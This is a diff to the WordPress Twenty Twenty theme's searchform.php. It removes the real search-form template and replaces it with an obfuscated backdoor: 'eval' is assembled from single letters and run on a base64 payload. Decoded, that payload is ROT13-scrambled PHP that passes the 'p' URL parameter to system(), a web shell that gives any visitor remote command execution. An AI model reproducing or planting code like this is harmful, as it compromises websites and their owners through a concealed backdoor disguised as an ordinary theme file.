@@ -1,47 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The searchform.php template.
- *
- * Used any time that get_search_form() is called.
- *
- * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
- *
- * @package WordPress
- * @subpackage Twenty_Twenty
- * @since Twenty Twenty 1.0
- */
-
-/*
- * Generate a unique ID for each form and a string containing an aria-label
- * if one was passed to get_search_form() in the args array.
- */
-$twentytwenty_unique_id = twentytwenty_unique_id( 'search-form-' );
-
-$twentytwenty_aria_label = ! empty( $args['aria_label'] ) ? 'aria-label="' . esc_attr( $args['aria_label'] ) . '"' : '';
-// Backward compatibility, in case a child theme template uses a `label` argument.
-if ( empty( $twentytwenty_aria_label ) && ! empty( $args['label'] ) ) {
-	$twentytwenty_aria_label = 'aria-label="' . esc_attr( $args['label'] ) . '"';
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGZybmVwdXNiZXouY3VjIGdyemN5bmdyLgogKgogKiBIZnJxIG5hbCBndnpyIGd1bmcgdHJnX2ZybmVwdV9zYmV6KCkgdmYgcG55eXJxLgogKgogKiBAeXZheCB1Z2djZjovL3FyaXJ5YmNyZS5qYmVxY2VyZmYuYmV0L2d1cnpyZi9vbmZ2cGYvZ3J6Y3luZ3ItdXZyZW5lcHVsLwogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0dqcmFnbAogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbCAxLjAKICovCgovKgogKiBUcmFyZW5nciBuIGhhdmRociBWUSBzYmUgcm5wdSBzYmV6IG5hcSBuIGZnZXZhdCBwYmFnbnZhdmF0IG5hIG5ldm4teW5vcnkKICogdnMgYmFyIGpuZiBjbmZmcnEgZ2IgdHJnX2ZybmVwdV9zYmV6KCkgdmEgZ3VyIG5ldGYgbmVlbmwuCiAqLwokZ2pyYWdsZ2pyYWdsX2hhdmRocl92cSA9IGdqcmFnbGdqcmFnbF9oYXZkaHJfdnEoICdmcm5lcHUtc2Jlei0nICk7CgokZ2pyYWdsZ2pyYWdsX25ldm5feW5vcnkgPSAhIHJ6Y2dsKCAkbmV0ZlsnbmV2bl95bm9yeSddICkgPyAnbmV2bi15bm9yeT1cIicgLiByZnBfbmdnZSggJG5ldGZbJ25ldm5feW5vcnknXSApIC4gJ1wiJyA6ICcnOwovLyBPbnB4am5lcSBwYnpjbmd2b3Z5dmdsLCB2YSBwbmZyIG4gcHV2eXEgZ3VyenIgZ3J6Y3luZ3IgaGZyZiBuIGB5bm9yeWAgbmV0aHpyYWcuCnZzICggcnpjZ2woICRnanJhZ2xnanJhZ2xfbmV2bl95bm9yeSApICYmICEgcnpjZ2woICRuZXRmWyd5bm9yeSddICkgKSB7CgkkZ2pyYWdsZ2pyYWdsX25ldm5feW5vcnkgPSAnbmV2bi15bm9yeT1cIicgLiByZnBfbmdnZSggJG5ldGZbJ3lub3J5J10gKSAuICdcIic7Cn0KPz4KPHNiZXogZWJ5cj1cImZybmVwdVwiIDw/Y3VjIHJwdWIgJGdqcmFnbGdqcmFnbF9uZXZuX3lub3J5OyAvLyBjdWNwZjp2dGFiZXIgSmJlcUNlcmZmLkZycGhldmdsLlJmcG5jckJoZ2NoZy5CaGdjaGdBYmdSZnBuY3JxIC0tIFJmcG5jcnEgbm9iaXIuID8+IHpyZ3VicT1cInRyZ1wiIHB5bmZmPVwiZnJuZXB1LXNiZXpcIiBucGd2YmE9XCI8P2N1YyBycHViIHJmcF9oZXkoIHVienJfaGV5KCAnLycgKSApOyA/PlwiPgoJPHlub3J5IHNiZT1cIjw/Y3VjIHJwdWIgcmZwX25nZ2UoICRnanJhZ2xnanJhZ2xfaGF2ZGhyX3ZxICk7ID8+XCI+CgkJPGZjbmEgcHluZmY9XCJmcGVycmEtZXJucXJlLWdya2dcIj4KCQkJPD9jdWMKCQkJLyogZ2VuYWZ5bmdiZWY6IFV2cXFyYSBucHByZmZ2b3Z5dmdsIGdya2cuICovCgkJCV9yKCAnRnJuZXB1IHNiZTonLCAnZ2pyYWdsZ2pyYWdsJyApOyAvLyBjdWNwZjp2dGFiZXI6IEpiZXFDZXJmZi5GcnBoZXZnbC5SZnBuY3JCaGdjaGcuSGFmbnNyQ2V2YWd2YXRTaGFwZ3ZiYSAtLSBwYmVyIGdlaGZnZiBnZW5hZnluZ3ZiYWYKCQkJPz4KCQk8L2ZjbmE+CgkJPHZhY2hnIGdsY3I9XCJmcm5lcHVcIiB2cT1cIjw/Y3VjIHJwdWIgcmZwX25nZ2UoICRnanJhZ2xnanJhZ2xfaGF2ZGhyX3ZxICk7ID8+XCIgcHluZmY9XCJmcm5lcHUtc3ZyeXFcIiBjeW5wcnVieXFyZT1cIjw/Y3VjIHJwdWIgcmZwX25nZ2VfayggJ0ZybmVwdSAmdXJ5eXZjOycsICdjeW5wcnVieXFyZScsICdnanJhZ2xnanJhZ2wnICk7ID8+XCIgaW55aHI9XCI8P2N1YyBycHViIHRyZ19mcm5lcHVfZGhyZWwoKTsgPz5cIiBhbnpyPVwiZlwiIC8+Cgk8L3lub3J5PgoJPHZhY2hnIGdsY3I9XCJmaG96dmdcIiBweW5mZj1cImZybmVwdS1maG96dmdcIiBpbnlocj1cIjw/Y3VjIHJwdWIgcmZwX25nZ2VfayggJ0ZybmVwdScsICdmaG96dmcgb2hnZ2JhJywgJ2dqcmFnbGdqcmFnbCcgKTsgPz5cIiAvPgo8L3NiZXo+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-<form role="search" <?php echo $twentytwenty_aria_label; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped -- Escaped above. ?> method="get" class="search-form" action="<?php echo esc_url( home_url( '/' ) ); ?>">
-	<label for="<?php echo esc_attr( $twentytwenty_unique_id ); ?>">
-		<span class="screen-reader-text">
-			<?php
-			/* translators: Hidden accessibility text. */
-			_e( 'Search for:', 'twentytwenty' ); // phpcs:ignore: WordPress.Security.EscapeOutput.UnsafePrintingFunction -- core trusts translations
-			?>
-		</span>
-		<input type="search" id="<?php echo esc_attr( $twentytwenty_unique_id ); ?>" class="search-field" placeholder="<?php echo esc_attr_x( 'Search &hellip;', 'placeholder', 'twentytwenty' ); ?>" value="<?php echo get_search_query(); ?>" name="s" />
-	</label>
-	<input type="submit" class="search-submit" value="<?php echo esc_attr_x( 'Search', 'submit button', 'twentytwenty' ); ?>" />
-</form>
